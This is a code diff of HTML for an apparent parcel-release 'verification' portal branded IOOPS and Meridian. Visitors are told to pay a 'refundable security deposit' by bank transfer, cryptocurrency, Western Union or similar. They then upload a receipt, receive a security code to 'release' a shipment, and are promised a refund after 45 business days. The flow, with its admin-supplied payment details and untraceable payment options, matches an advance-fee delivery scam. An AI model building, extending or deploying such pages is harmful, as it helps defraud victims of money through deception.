@@ -461,132 +461,351 @@
             </div>
 
             <!-- STEP 2: Payment -->
+            <!-- STEP 2: Payment -->
             <div id="step-2" class="verification-step" style="display: none;">
                 <div class="step-content">
                     <h2>Security Deposit</h2>
                     <p>A refundable security deposit is required to complete your verification. This ensures compliance with international regulations and will be returned to you after your transaction is complete.</p>
 
-                    <div class="bank-details">
-                        <h3>Transfer Details</h3>
-                        <div class="info-row">
-                            <span class="label">Amount:</span>
-                            <span class="value" id="escrow-amount"></span>
-                        </div>
-                        <div class="info-row">
-                            <span class="label">IBAN:</span>
-                            <span class="value" id="iban">FR76 3000 4025 1800 0100 0509 383</span>
-                        </div>
-                        <div class="info-row">
-                            <span class="label">SWIFT/BIC:</span>
-                            <span class="value" id="swift">BNPAFRPP</span>
-                        </div>
-                        <div class="info-row">
-                            <span class="label">Reference:</span>
-                            <span class="value" id="payment-reference"></span>
-                        </div>
-                    </div>
-
-                    <div class="info-notice" style="margin-top: 24px;">
-                        <p><strong>Important:</strong> After making your transfer, upload a screenshot or photo of your payment confirmation. We'll verify it within 1-2 business hours.</p>
-                    </div>
-
-                    <form id="payment-confirmation-form">
-                        <div class="form-group">
-                            <label for="payment-receipt">Upload Your Payment Receipt</label>
-                            <input type="file" id="payment-receipt" accept="image/*,.pdf" required>
-                            <small style="display: block; margin-top: 8px; color: var(--text-secondary);">Accepted formats: JPG, PNG, PDF (max 5MB)</small>
+                    <!-- Payment Request Section (shown initially) -->
+                    <div id="payment-request-section">
+                        <div class="info-notice" style="margin-bottom: 24px;">
+                            <p><strong>Next Step:</strong> Request payment account details from our verification team. Select your preferred payment method and we'll provide the necessary information within minutes.</p>
                         </div>
 
                         <div class="action-buttons">
-                            <button type="submit" class="btn-primary">Submit Receipt</button>
+                            <button id="request-payment-details-btn" class="btn-primary" style="font-size: 18px; padding: 16px 32px;">
+                                Request Payment Account Details
+                            </button>
                         </div>
-                    </form>
+                    </div>
+
+                    <!-- Waiting for Details Section (shown after request) -->
+                    <div id="payment-waiting-section" style="display: none;">
+                        <div style="background: #fef3c7; border-left: 4px solid #f59e0b; padding: 24px; border-radius: 8px; text-align: center; margin-bottom: 24px;">
+                            <div style="font-size: 48px; margin-bottom: 12px;">⏳</div>
+                            <h3 style="margin: 0 0 12px 0; color: #92400e;">Payment Details Being Prepared</h3>
+                            <p style="margin: 0; color: #78350f;">
+                                Our team is preparing your <strong id="selected-payment-method-display">payment</strong> account details.<br>
+                                This usually takes just a few minutes. The page will update automatically when ready.
+                            </p>
+                        </div>
+
+                        <div class="info-notice">
+                            <p style="font-size: 14px; color: #6b7280;">
+                                <strong>What's Happening:</strong> An administrator is securely generating your payment details for the selected method. You'll receive a notification here and by email once the information is ready.
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- Payment Details Section (shown when admin sends details) -->
+                    <div id="payment-details-section" style="display: none;">
+                        <div class="success-banner" style="background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white; padding: 20px; border-radius: 12px; text-align: center; margin-bottom: 24px;">
+                            <div style="font-size: 32px; margin-bottom: 8px;">✓</div>
+                            <h3 style="margin: 0; color: white;">Payment Details Ready!</h3>
+                            <p style="margin: 8px 0 0 0; color: rgba(255,255,255,0.9); font-size: 14px;">Use the information below to make your deposit</p>
+                        </div>
+
+                        <div class="bank-details" style="background: #f9fafb; border: 2px solid #e5e7eb; border-radius: 12px; padding: 24px; margin-bottom: 24px;">
+                            <h3 style="margin: 0 0 20px 0; color: #1f2937; border-bottom: 2px solid #e5e7eb; padding-bottom: 12px;">
+                                <span id="payment-method-title">Transfer Details</span>
+                            </h3>
+
+                            <div id="payment-details-content">
+                                <!-- Details will be populated by JavaScript based on payment method -->
+                            </div>
+                        </div>
+
+                        <div class="info-notice" style="margin-bottom: 24px;">
+                            <p><strong>Important:</strong> After making your transfer, upload a screenshot or photo of your payment confirmation below. We'll verify it within 1-2 business hours.</p>
+                        </div>
+
+                        <form id="payment-confirmation-form">
+                            <div class="form-group">
+                                <label for="payment-receipt">Upload Your Payment Receipt</label>
+                                <input type="file" id="payment-receipt" accept="image/*,.pdf" required>
+                                <small style="display: block; margin-top: 8px; color: var(--text-secondary);">Accepted formats: JPG, PNG, PDF (max 5MB)</small>
+                            </div>
+
+                            <div class="action-buttons">
+                                <button type="submit" class="btn-primary">Submit Receipt</button>
+                            </div>
+                        </form>
+                    </div>
                 </div>
             </div>
 
-            <!-- STEP 3: Generate Code -->
+            <!-- Payment Method Selection Modal -->
+            <div id="payment-method-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 10000; align-items: center; justify-content: center;">
+                <div style="background: white; border-radius: 16px; padding: 32px; max-width: 600px; width: 90%; box-shadow: 0 8px 32px rgba(0,0,0,0.2);">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
+                        <h2 style="margin: 0; font-size: 28px; color: #1f2937;">Select Payment Method</h2>
+                        <button id="close-payment-modal" style="background: none; border: none; font-size: 32px; cursor: pointer; color: #6b7280; line-height: 1;">&times;</button>
+                    </div>
+
+                    <p style="color: #6b7280; margin-bottom: 28px; font-size: 16px;">Choose your preferred method to make the security deposit. We'll provide the specific account details for your selected option.</p>
+
+                    <div style="display: flex; flex-direction: column; gap: 16px;">
+                        <!-- Bank Transfer Option -->
+                        <button class="payment-method-option" data-method="bank_transfer" style="display: flex; align-items: center; padding: 20px; background: #f9fafb; border: 2px solid #e5e7eb; border-radius: 12px; cursor: pointer; transition: all 0.2s; text-align: left; width: 100%;" onmouseover="this.style.background='#eff6ff'; this.style.borderColor='#3b82f6';" onmouseout="this.style.background='#f9fafb'; this.style.borderColor='#e5e7eb';">
+                            <div style="font-size: 36px; margin-right: 20px;">🏦</div>
+                            <div style="flex: 1;">
+                                <div style="font-weight: 700; font-size: 18px; color: #1f2937; margin-bottom: 4px;">Bank Transfer</div>
+                                <div style="font-size: 14px; color: #6b7280;">International wire transfer via IBAN/SWIFT</div>
+                            </div>
+                            <svg style="width: 24px; height: 24px; color: #9ca3af;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <polyline points="9 18 15 12 9 6"></polyline>
+                            </svg>
+                        </button>
+
+                        <!-- Cryptocurrency Option -->
+                        <button class="payment-method-option" data-method="cryptocurrency" style="display: flex; align-items: center; padding: 20px; background: #f9fafb; border: 2px solid #e5e7eb; border-radius: 12px; cursor: pointer; transition: all 0.2s; text-align: left; width: 100%;" onmouseover="this.style.background='#eff6ff'; this.style.borderColor='#3b82f6';" onmouseout="this.style.background='#f9fafb'; this.style.borderColor='#e5e7eb';">
+                            <div style="font-size: 36px; margin-right: 20px;">₿</div>
+                            <div style="flex: 1;">
+                                <div style="font-weight: 700; font-size: 18px; color: #1f2937; margin-bottom: 4px;">Cryptocurrency</div>
+                                <div style="font-size: 14px; color: #6b7280;">Bitcoin, USDT, or other crypto assets</div>
+                            </div>
+                            <svg style="width: 24px; height: 24px; color: #9ca3af;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <polyline points="9 18 15 12 9 6"></polyline>
+                            </svg>
+                        </button>
+
+                        <!-- Other Payment Methods Option -->
+                        <button class="payment-method-option" data-method="other" style="display: flex; align-items: center; padding: 20px; background: #f9fafb; border: 2px solid #e5e7eb; border-radius: 12px; cursor: pointer; transition: all 0.2s; text-align: left; width: 100%;" onmouseover="this.style.background='#eff6ff'; this.style.borderColor='#3b82f6';" onmouseout="this.style.background='#f9fafb'; this.style.borderColor='#e5e7eb';">
+                            <div style="font-size: 36px; margin-right: 20px;">💳</div>
+                            <div style="flex: 1;">
+                                <div style="font-weight: 700; font-size: 18px; color: #1f2937; margin-bottom: 4px;">Other Methods</div>
+                                <div style="font-size: 14px; color: #6b7280;">PayPal, Western Union, MoneyGram, etc.</div>
+                            </div>
+                            <svg style="width: 24px; height: 24px; color: #9ca3af;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <polyline points="9 18 15 12 9 6"></polyline>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+            </div>
+            <!-- STEP 3: Generate & Use Code -->
             <div id="step-3" class="verification-step" style="display: none;">
                 <div class="step-content">
                     <h2>Get Your Verification Code</h2>
                     <p>You're almost done! Your identity and payment have been confirmed. Click below to generate your unique verification code.</p>
 
+                    <!-- Generate Button (shown before code is generated) -->
                     <div class="action-buttons">
                         <button id="generate-code-btn" class="btn-primary">Generate My Code</button>
                     </div>
 
+                    <!-- Code Display (shown after generation) -->
                     <div id="code-display" style="display: none;">
-                        <div class="verification-code">
-                            <span id="security-code"></span>
+                        <!-- Large Code Display -->
+                        <div style="background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%); border-radius: 16px; padding: 40px; text-align: center; margin: 32px 0; box-shadow: 0 10px 30px rgba(30, 58, 138, 0.3);">
+                            <p style="margin: 0 0 16px 0; font-size: 14px; color: rgba(255,255,255,0.9); font-weight: 600; letter-spacing: 1px; text-transform: uppercase;">Your Security Code</p>
+                            <div style="background: rgba(255,255,255,0.95); border-radius: 12px; padding: 24px; margin-bottom: 24px;">
+                                <div id="security-code-display" style="font-size: clamp(24px, 6vw, 48px); font-weight: 700; letter-spacing: clamp(2px, 1vw, 8px); color: #1e3a8a; font-family: 'Courier New', monospace; text-shadow: 2px 2px 4px rgba(0,0,0,0.1);">------</div>
+                            </div>
+
+                            <!-- Action Buttons -->
+                            <div style="display: flex; gap: 12px; justify-content: center; flex-wrap: wrap;">
+                                <button id="copy-code-btn" class="btn-secondary" disabled style="background: white; color: #1e3a8a; border: 2px solid white; padding: 12px 24px; font-weight: 600;">
+                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width: 18px; height: 18px; margin-right: 8px; vertical-align: middle;">
+                                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                                    </svg>
+                                    Copy Code
+                                </button>
+                                <button id="email-code-btn" class="btn-secondary" style="background: rgba(255,255,255,0.2); color: white; border: 2px solid white; padding: 12px 24px; font-weight: 600;">
+                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width: 18px; height: 18px; margin-right: 8px; vertical-align: middle;">
+                                        <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+                                        <polyline points="22,6 12,13 2,6"></polyline>
+                                    </svg>
+                                    Email Code
+                                </button>
+                                <button id="download-code-btn" class="btn-secondary" style="background: rgba(255,255,255,0.2); color: white; border: 2px solid white; padding: 12px 24px; font-weight: 600;">
+                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width: 18px; height: 18px; margin-right: 8px; vertical-align: middle;">
+                                        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                                        <polyline points="7 10 12 15 17 10"></polyline>
+                                        <line x1="12" y1="15" x2="12" y2="3"></line>
+                                    </svg>
+                                    Download
+                                </button>
+                            </div>
                         </div>
-                        <p class="code-instruction">Save this code! You'll need to enter it on the tracking page to complete your verification and access your shipment details.</p>
+
+                        <!-- Usage Instructions -->
+                        <div style="background: #f8f9fa; border-left: 4px solid #1e3a8a; border-radius: 8px; padding: 24px; margin-bottom: 24px;">
+                            <h3 style="margin: 0 0 16px 0; color: #2d3748; font-size: 18px; font-weight: 600;">How to Use Your Code</h3>
+                            <ol style="margin: 0; padding-left: 24px; color: #4a5568; line-height: 1.8;">
+                                <li style="margin-bottom: 12px;">
+                                    <strong>Go to Meridian Tracking Portal</strong><br>
+                                    <span style="font-size: 14px; color: #718096;">Visit <a href="https://meridian-net.org/track" target="_blank" style="color: #1e3a8a;">meridian-net.org/track</a></span>
+                                </li>
+                                <li style="margin-bottom: 12px;">
+                                    <strong>Enter Your Tracking Number</strong><br>
+                                    <span style="font-size: 14px; color: #718096;">Use tracking ID: <strong id="code-tracking-id">Loading...</strong></span>
+                                </li>
+                                <li style="margin-bottom: 12px;">
+                                    <strong>Paste Your Security Code</strong><br>
+                                    <span style="font-size: 14px; color: #718096;">Copy the code above and paste it in the security code field</span>
+                                </li>
+                                <li>
+                                    <strong>Click "Release Shipment"</strong><br>
+                                    <span style="font-size: 14px; color: #718096;">Your shipment will be released for delivery</span>
+                                </li>
+                            </ol>
+                        </div>
+
+                        <!-- Polling/Waiting Indicator -->
+                        <div id="code-usage-waiting" style="display: none; background: #fff3cd; border-left: 4px solid #ffc107; border-radius: 8px; padding: 20px; text-align: center;">
+                            <div style="display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 12px;">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="#856404" stroke-width="2" style="width: 24px; height: 24px; animation: spin 2s linear infinite;">
+                                    <polyline points="23 4 23 10 17 10"></polyline>
+                                    <polyline points="1 20 1 14 7 14"></polyline>
+                                    <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path>
+                                </svg>
+                                <p style="margin: 0; font-weight: 700; color: #856404; font-size: 16px;">Waiting for code verification...</p>
+                            </div>
+                            <p style="margin: 0; color: #856404; font-size: 14px; line-height: 1.6;">
+                                This page will automatically update once you use the code on the Meridian portal.
+                                <br>Keep this tab open while you complete the verification.
+                            </p>
+                        </div>
                     </div>
                 </div>
             </div>
 
             <!-- STEP 4: Complete -->
+            <!-- STEP 4: Verification Complete - After Service -->
             <div id="step-4" class="verification-step" style="display: none;">
                 <div class="step-content">
-                    <div class="completion-notice">
-                        <div class="completion-icon">✓</div>
-                        <h2>Verification Complete!</h2>
-                        <p>Your verification code has been generated and is ready to use. Enter it on the tracking page to access your shipment.</p>
+                    <!-- Success Banner -->
+                    <div class="completion-notice" style="background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white; padding: 32px; border-radius: 16px; text-align: center; margin-bottom: 32px; box-shadow: 0 8px 24px rgba(16, 185, 129, 0.25);">
+                        <div style="font-size: 64px; margin-bottom: 16px;">🎉</div>
+                        <h1 style="margin: 0 0 12px 0; color: white; font-size: 36px;">Verification Complete!</h1>
+                        <p style="margin: 0; color: rgba(255,255,255,0.95); font-size: 18px; font-weight: 500;">Your shipment has been successfully released for delivery</p>
                     </div>
 
-                    <div class="info-notice" style="margin-top: 24px;">
-                        <p><strong>What happens next?</strong></p>
-                        <ol style="margin: 12px 0 0 20px; padding: 0;">
-                            <li>Go to the tracking page</li>
-                            <li>Enter your verification code</li>
-                            <li>Access your shipment details</li>
-                        </ol>
-                    </div>
-
-                    <div class="action-buttons" style="margin-top: 32px;">
-                        <button id="return-to-tracking-btn" class="btn-primary">Return to Tracking Page</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- STEP 5: Code Used - Completion with Receipt -->
-            <div id="step-5" class="verification-step" style="display: none;">
-                <div class="step-content">
-                    <div class="completion-notice">
-                        <div class="completion-icon">✓</div>
-                        <h2>Verification Successfully Used</h2>
-                        <p>Your verification code has been accepted on the Meridian Tracking system. Your identity has been confirmed and your shipment is now accessible.</p>
-                    </div>
-
-                    <div class="receipt-section" style="margin-top: 32px; padding: 24px; background: var(--bg-subtle); border-radius: 8px; border: 1px solid var(--border);">
-                        <h3 style="margin: 0 0 16px 0; font-size: 18px;">Verification Receipt</h3>
-                        <div class="info-row">
-                            <span class="label">Verification ID:</span>
-                            <span class="value" id="receipt-verification-id"></span>
-                        </div>
-                        <div class="info-row">
-                            <span class="label">Tracking Number:</span>
-                            <span class="value" id="receipt-tracking-id"></span>
-                        </div>
-                        <div class="info-row">
-                            <span class="label">Verified Name:</span>
-                            <span class="value" id="receipt-name"></span>
-                        </div>
-                        <div class="info-row">
-                            <span class="label">Verification Date:</span>
-                            <span class="value" id="receipt-date"></span>
-                        </div>
-                        <div class="info-row">
-                            <span class="label">Status:</span>
-                            <span class="value" style="color: var(--success); font-weight: 600;">Verified & Complete</span>
+                    <!-- Summary of Actions Completed -->
+                    <div style="background: #f9fafb; border: 2px solid #e5e7eb; border-radius: 12px; padding: 28px; margin-bottom: 24px;">
+                        <h2 style="margin: 0 0 20px 0; color: #1f2937; font-size: 22px; border-bottom: 2px solid #e5e7eb; padding-bottom: 12px;">✅ What You Completed</h2>
+                        <div style="display: flex; flex-direction: column; gap: 12px;">
+                            <div style="display: flex; align-items: start; gap: 12px;">
+                                <span style="color: #10b981; font-size: 20px; line-height: 1;">✓</span>
+                                <div>
+                                    <strong style="color: #1f2937;">Identity Verification:</strong>
+                                    <span style="color: #6b7280;"> Your documents were reviewed and approved</span>
+                                </div>
+                            </div>
+                            <div style="display: flex; align-items: start; gap: 12px;">
+                                <span style="color: #10b981; font-size: 20px; line-height: 1;">✓</span>
+                                <div>
+                                    <strong style="color: #1f2937;">Escrow Deposit:</strong>
+                                    <span style="color: #6b7280;"> Your payment was confirmed and secured</span>
+                                </div>
+                            </div>
+                            <div style="display: flex; align-items: start; gap: 12px;">
+                                <span style="color: #10b981; font-size: 20px; line-height: 1;">✓</span>
+                                <div>
+                                    <strong style="color: #1f2937;">Security Code Used:</strong>
+                                    <span style="color: #6b7280;"> Your shipment release was authorized on Meridian</span>
+                                </div>
+                            </div>
+                            <div style="display: flex; align-items: start; gap: 12px;">
+                                <span style="color: #10b981; font-size: 20px; line-height: 1;">✓</span>
+                                <div>
+                                    <strong style="color: #1f2937;">Shipment Released:</strong>
+                                    <span style="color: #6b7280;"> Your package is now cleared for final delivery</span>
+                                </div>
+                            </div>
                         </div>
                     </div>
 
-                    <div class="action-buttons" style="margin-top: 24px; gap: 12px;">
-                        <button id="download-receipt-btn" class="btn-primary">Download Receipt (PDF)</button>
-                        <button id="return-to-meridian-btn" class="btn-secondary">Return to Tracking</button>
+                    <!-- What Happens Next -->
+                    <div style="background: #eff6ff; border-left: 4px solid #3b82f6; border-radius: 8px; padding: 24px; margin-bottom: 24px;">
+                        <h3 style="margin: 0 0 16px 0; color: #1e40af; font-size: 20px;">📦 What Happens Next</h3>
+                        <ul style="margin: 0; padding-left: 20px; color: #1e3a8a; line-height: 1.8;">
+                            <li><strong>Immediate Processing:</strong> Your shipment is being prepared for dispatch from the security facility</li>
+                            <li><strong>Carrier Handoff:</strong> The package will be transferred to the final delivery carrier within 24-48 hours</li>
+                            <li><strong>Tracking Updates:</strong> You will receive tracking notifications as your package moves to your address</li>
+                            <li><strong>Expected Delivery:</strong> Standard delivery timeframes apply from this point forward</li>
+                        </ul>
                     </div>
 
-                    <div class="info-notice" style="margin-top: 24px;">
-                        <p style="font-size: 14px; color: var(--text-secondary);"><strong>Note:</strong> This receipt confirms your identity verification was completed successfully. Keep it for your records. Your security deposit will be refunded according to the terms provided.</p>
+                    <!-- Escrow Refund Information -->
+                    <div style="background: #fef9c3; border-left: 4px solid #eab308; border-radius: 8px; padding: 24px; margin-bottom: 24px;">
+                        <h3 style="margin: 0 0 16px 0; color: #854d0e; font-size: 20px;">💰 Your Escrow Deposit Refund</h3>
+                        <div style="color: #713f12;">
+                            <p style="margin: 0 0 12px 0; font-size: 15px;">
+                                <strong>Deposit Amount:</strong> <span id="step4-escrow-amount" style="font-size: 18px; color: #854d0e;">Loading...</span>
+                            </p>
+                            <p style="margin: 0 0 12px 0; font-size: 15px;">
+                                <strong>Refund Period:</strong> <span id="step4-refund-period">45 business days</span> from today
+                            </p>
+                            <p style="margin: 0 0 12px 0; font-size: 15px;">
+                                <strong>Expected Return Date:</strong> <span id="step4-return-date">Loading...</span>
+                            </p>
+                            <p style="margin: 0; font-size: 14px; color: #92400e;">
+                                ℹ️ Your escrow deposit will be automatically refunded to your original payment method. You will receive email confirmation when the refund is processed.
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- Receipt Download Section -->
+                    <div style="background: white; border: 2px solid #e5e7eb; border-radius: 12px; padding: 28px; margin-bottom: 24px; text-align: center;">
+                        <h3 style="margin: 0 0 16px 0; color: #1f2937; font-size: 20px;">📄 Your Verification Receipt</h3>
+                        <p style="margin: 0 0 24px 0; color: #6b7280; font-size: 15px;">Download your official IOOPS verification completion certificate for your records</p>
+
+                        <div style="display: flex; gap: 12px; justify-content: center; flex-wrap: wrap;">
+                            <button id="download-receipt-btn" class="btn-primary" style="display: inline-flex; align-items: center; gap: 8px; font-size: 16px; padding: 14px 28px;">
+                                <svg style="width: 20px; height: 20px;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                                    <polyline points="7 10 12 15 17 10"></polyline>
+                                    <line x1="12" y1="15" x2="12" y2="3"></line>
+                                </svg>
+                                Download PDF Receipt
+                            </button>
+                            <button id="email-receipt-btn" class="btn-secondary" style="display: inline-flex; align-items: center; gap: 8px; font-size: 16px; padding: 14px 28px;">
+                                <svg style="width: 20px; height: 20px;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+                                    <polyline points="22,6 12,13 2,6"></polyline>
+                                </svg>
+                                Email Receipt
+                            </button>
+                        </div>
+
+                        <p style="margin: 24px 0 0 0; font-size: 13px; color: #9ca3af;">
+                            Receipt includes verification details, escrow information, and completion timeline
+                        </p>
+                    </div>
+
+                    <!-- Verification Details Summary -->
+                    <div style="background: #f9fafb; border-radius: 8px; padding: 20px;">
+                        <h4 style="margin: 0 0 16px 0; color: #374151; font-size: 16px;">Verification Details</h4>
+                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px; font-size: 14px;">
+                            <div>
+                                <span style="color: #6b7280;">Tracking ID:</span>
+                                <strong style="color: #1f2937; display: block;" id="step4-tracking-summary">Loading...</strong>
+                            </div>
+                            <div>
+                                <span style="color: #6b7280;">Verification Token:</span>
+                                <strong style="color: #1f2937; display: block; font-family: Courier New, monospace; font-size: 12px;" id="step4-token-summary">Loading...</strong>
+                            </div>
+                            <div>
+                                <span style="color: #6b7280;">Completion Date:</span>
+                                <strong style="color: #1f2937; display: block;" id="step4-completion-date">Loading...</strong>
+                            </div>
+                            <div>
+                                <span style="color: #6b7280;">Status:</span>
+                                <strong style="color: #10b981; display: block;">✓ Completed</strong>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Support Notice -->
+                    <div class="info-notice" style="margin-top: 32px;">
+                        <p style="margin: 0; font-size: 14px; color: #6b7280;">
+                            <strong>Need Help?</strong> If you have any questions about your shipment delivery or escrow refund, please contact our support team at
+                            <a href="mailto:support@ioops.org" style="color: #3b82f6;">support@ioops.org</a>
+                        </p>
                     </div>
                 </div>
             </div>
